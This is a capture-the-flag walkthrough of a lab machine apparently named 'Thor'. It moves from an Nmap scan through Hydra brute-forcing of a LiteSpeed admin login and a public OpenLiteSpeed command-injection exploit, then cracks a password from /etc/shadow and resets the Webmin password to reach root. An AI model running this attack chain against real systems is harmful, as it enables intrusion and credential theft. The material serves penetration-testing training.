---
icon: ubuntu
---

# Thor - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.208 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 17:13 EDT
Nmap scan report for 192.168.209.208
Host is up (0.027s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp    open  http          LiteSpeed
|_http-server-header: LiteSpeed
|_http-title: Jane Foster - Personal Portfolio
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     etag: "85e2-604fc846-26fe7;;;"                                                                                                                
|     last-modified: Mon, 15 Mar 2021 20:49:10 GMT                                                                                                  
|     content-type: text/html                                                                                                                       
|     content-length: 34274                                                                                                                         
|     accept-ranges: bytes                                                                                                                          
|     date: Wed, 08 Oct 2025 21:15:34 GMT                                                                                                           
|     server: LiteSpeed                                                                                                                             
|     connection: close                                                                                                                             
|     <!doctype html>                                                                                                                               
|     <html lang="en">                                                                                                                              
|     <head>                                                                                                                                        
|     <!--====== Required meta tags ======-->                                                                                                       
|     <meta charset="utf-8">                                                                                                                        
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                         
|     <meta name="description" content="">                                                                                                          
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">                                                        
|     <!--====== Title ======-->                                                                                                                    
|     <title>Jane Foster - Personal Portfolio</title>                                                                                               
|     <!--====== Favicon Icon ======-->                                                                                                             
|     <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">                                                                  
|     <!--====== Bootstrap css ======-->                                                                                                            
|     <link rel="stylesheet" href="assets/css/bootstrap.min.css">                                                                                   
|     <!--====== Line Icons css ======-->                                                                                                           
|   HTTPOptions:                                                                                                                                    
|     HTTP/1.0 200 OK                                                                                                                               
|     etag: "85e2-604fc846-26fe7;;;"                                                                                                                
|     last-modified: Mon, 15 Mar 2021 20:49:10 GMT                                                                                                  
|     content-type: text/html                                                                                                                       
|     content-length: 34274                                                                                                                         
|     accept-ranges: bytes                                                                                                                          
|     date: Wed, 08 Oct 2025 21:15:35 GMT                                                                                                           
|     server: LiteSpeed                                                                                                                             
|     connection: close                                                                                                                             
|     <!doctype html>                                                                                                                               
|     <html lang="en">                                                                                                                              
|     <head>                                                                                                                                        
|     <!--====== Required meta tags ======-->                                                                                                       
|     <meta charset="utf-8">                                                                                                                        
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                         
|     <meta name="description" content="">                                                                                                          
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">                                                        
|     <!--====== Title ======-->
|     <title>Jane Foster - Personal Portfolio</title>
|     <!--====== Favicon Icon ======-->
|     <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
|     <!--====== Bootstrap css ======-->
|     <link rel="stylesheet" href="assets/css/bootstrap.min.css">
|_    <!--====== Line Icons css ======-->
7080/tcp  open  ssl/empowerid LiteSpeed
| ssl-cert: Subject: commonName=ubuntu/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2022-06-07T09:39:58
|_Not valid after:  2024-09-04T09:39:58
| http-title: LiteSpeed WebAdmin Console
|_Requested resource was https://192.168.209.208:7080/login.php
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 302 Found
|     x-powered-by: PHP/5.6.36
|     x-frame-options: SAMEORIGIN
|     x-xss-protection: 1;mode=block
|     referrer-policy: same-origin
|     x-content-type-options: nosniff
|     set-cookie: LSUI37FE0C43B84483E0=47a5785129eb1aa8fb4969b79e1b068f; path=/; secure; HttpOnly
|     expires: Thu, 19 Nov 1981 08:52:00 GMT
|     cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
|     pragma: no-cache
|     set-cookie: LSID37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSPA37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSUI37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     location: /login.php
|     content-type: text/html; charset=UTF-8
|     content-length: 0
|     date: Wed, 08 Oct 2025 21:15:51 GMT
|     server: LiteSpeed
|     alt-svc: quic=":7080"; ma=2592000; v="43,46", h3-Q043=":7080";
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     x-powered-by: PHP/5.6.36
|     x-frame-options: SAMEORIGIN
|     x-xss-protection: 1;mode=block
|     referrer-policy: same-origin
|     x-content-type-options: nosniff
|     set-cookie: LSUI37FE0C43B84483E0=8a67b9be1b08d1e660737058619adae5; path=/; secure; HttpOnly
|     expires: Thu, 19 Nov 1981 08:52:00 GMT
|     cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
|     pragma: no-cache
|     set-cookie: LSID37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSPA37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     set-cookie: LSUI37FE0C43B84483E0=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
|     location: /login.php
|     content-type: text/html; charset=UTF-8
|     content-length: 0
|     date: Wed, 08 Oct 2025 21:15:51 GMT
|     server: LiteSpeed
|_    alt-svc: quic=":7080"; ma=2592000; v="43,46", h3-Q043=":7080";
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http          MiniServ 1.962 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
|_http-server-header: MiniServ/1.962
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

This is a portfolio page for Jane Foster. Nmap showed that port 80 is using LiteSpeed

### <mark style="color:$primary;">HTTP Port 7080</mark>

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

The LiteSpeed admin console is hosted here, operated by Jane Foster. Default credentials don't work here

<figure><img src="../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals 4 exploits for OpenLiteSpeed. One of them is an RCE, but it requires credentials.&#x20;

### <mark style="color:$primary;">Brute Force Login Form</mark>

I will put together a wordlist and try to BruteForce Creds. We know Jane Foster is the owner of this website, so will keep that in mind while creating our custom wordlist

At first I tried making a wordlist using cewl

```bash
cewl http://192.168.209.208 -d 5 --with-numbers > wordlist
```

I tried this wordlist with hydra and got nowhere. I am going to try the permutation of words within the created wordlist

```python
import itertools

filename = 'wordlist'
permutations = []

with open(filename, 'r') as file:
    wordlist = [line.strip() for line in file]

for combination in itertools.permutations(wordlist, 2):
    permutation = ''.join(combination)
    print(permutation)
```

This would combine two of the words together. Let's hope this list will work

```bash
python3 permute-wordlist.py | tee permutated-wordlist
```

{% code overflow="wrap" %}
```bash
hydra -l admin -P permutated-wordlist -s 7080 -t 64 192.168.209.208 https-post-form "/login.php:userid=admin&pass=^PASS^:Invalid credential" -v
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

We got it! Now armed with creds let's execute the RCE exploit we found earlier

### <mark style="color:$primary;">Openlitespeed WebServer 1.7.9 Command Injection \[Authenticated]</mark>

```
searchsploit -m 49556
```

For the exploit to work you must first change the command located at the path. Make sure it's the ip address of your attacking machine with your listeners port

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

Also you must make sure that for all requests \[POST,GET,etc...] you add the verify=False command. Here is an example

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

Now the RCE also requires us to specify a GroupID I am going to specify shadow

```
python3 49556.py 192.168.209.208:7080 admin Foster2020 shadow
```

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Shadow Group</mark>&#x20;

We are part of the shadow group, so we can read /etc/shadow

<figure><img src="../../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

I am going to try and crack thor's and root's hashes using john

<figure><img src="../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

```
thor:valkyrie
```

We were able to crack thor's password! Let's use it to ssh

```bash
ssh thor@192.168.209.208
```

<figure><img src="../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo Webmin</mark>

<figure><img src="../../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

`thor` can restart the Webmin instance with  `root`privileges

We can actually reset Webmin's password now that we have access to the host machine. [**Here**](https://linuxconfig.net/manuals/howto/how-to-reset-webmin-password.html) is how

<figure><img src="../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

Hmm, only the `bin` group has access to `/etc/webmin`

Earlier, the RCE exploit for OpenLiteSpeed required us to specify a GroupID, of which I specified `shadow` as the default. We can try specifying `bin` and using that shell to reset the password

```bash
python3 49556.py 192.168.209.208:7080 admin Foster2020 bin
```

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

Now we can reset the password and restart Webmin as `thor`:

```bash
/usr/share/webmin/changepass.pl /etc/webmin root password123
```

<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

With this now we can login to Webmin and view the dashboard

<figure><img src="../../.gitbook/assets/image (312).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Within Webmin, there's a webshell option

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

this gives us an instance as root. Let's get a proper shell

<figure><img src="../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

Now we are root!
